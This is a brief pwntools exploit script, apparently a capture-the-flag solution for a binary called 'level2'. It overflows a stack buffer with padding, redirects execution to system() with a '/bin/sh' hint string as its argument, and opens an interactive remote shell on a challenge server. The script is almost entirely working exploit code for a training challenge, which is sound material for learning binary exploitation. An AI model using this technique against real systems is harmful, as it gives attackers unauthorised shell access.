from pwn import *

e = ELF("./level2")
#p=process("./level2")
p = remote("111.198.29.45",33073)

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

#ret_addr = int("0x080482de", 16)
system_addr = e.symbols["system"]
binsh_addr = e.symbols["hint"]
print p.recv()

payload = "A"*(0x88+4) + p32(system_addr)+"BBBB"+p32(binsh_addr)
p.sendline(payload)
#print p.recv()

p.interactive()

